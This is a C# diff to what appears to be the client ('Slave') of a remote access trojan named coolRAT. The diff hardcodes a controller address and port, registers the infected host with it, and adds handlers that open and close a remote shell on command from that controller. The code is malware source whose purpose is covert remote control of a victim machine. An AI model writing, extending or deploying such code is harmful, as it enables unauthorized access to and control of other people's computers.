@@ -20,11 +20,52 @@ namespace coolRAT.Slave
             CAP_Client authClient = new CAP_Client(new IPEndPoint(IPAddress.Parse("192.168.5.6"), 8888));
             Console.WriteLine("Client Authorization Protocol client initialized");
             Console.WriteLine("Registering client...");
-            Client localClient = authClient.CreateClient(authClient.RegisterClient());
+            Globals.LocalClient = authClient.CreateClient(authClient.RegisterClient());
             Console.WriteLine("Connected!");
-            
+            Globals.LocalClient.RegisterPacketHandler("ConnectShellPacket", Shell_PacketReceivedHandler);
             Application.Run();
             return;
+        }
+
+        public static void Shell_PacketReceivedHandler(object sender, PacketReceivedEventArgs e)
+        {
+            if(e.Packet.Type == "ConnectShellPacket")
+            {
+                if (Globals.ShellInstance != null)
+                {
+                    Globals.ShellInstance.Stop();
+                    Globals.ShellInstance = null;
+                }
+
+                Globals.ShellInstance = new Shell(Globals.LocalClient);
+                ShellConnectedPacket result_success = new ShellConnectedPacket(Globals.LocalClient.UniqueId, Globals.ShellInstance.UniqueId, true);
+                Globals.LocalClient.SendPacket(result_success);
+
+                return;
+            }
+            if(e.Packet.Type == "DisconnectShellPacket")
+            {
+                DisconnectShellPacket packet = DisconnectShellPacket.Deserialize(e.RawPacket);
+                if (Globals.ShellInstance == null)
+                {
+                    ShellDisconnectedPacket shellDisconnectedPacket = new ShellDisconnectedPacket(Globals.LocalClient.UniqueId, packet.ShellUniqueId, false);
+                    Globals.LocalClient.SendPacket(shellDisconnectedPacket);
+                    return;
+                }
+
+                if(Globals.ShellInstance.UniqueId != packet.ShellUniqueId)
+                {
+                    ShellDisconnectedPacket shellDisconnectedPacket = new ShellDisconnectedPacket(Globals.LocalClient.UniqueId, packet.ShellUniqueId, false);
+                    Globals.LocalClient.SendPacket(shellDisconnectedPacket);
+                    return;
+                }
+
+                Globals.ShellInstance.Stop();
+                Globals.ShellInstance = null;
+                ShellDisconnectedPacket success = new ShellDisconnectedPacket(Globals.LocalClient.UniqueId, packet.ShellUniqueId, true);
+                Globals.LocalClient.SendPacket(success);
+                return;
+            }
         }
     }
 }
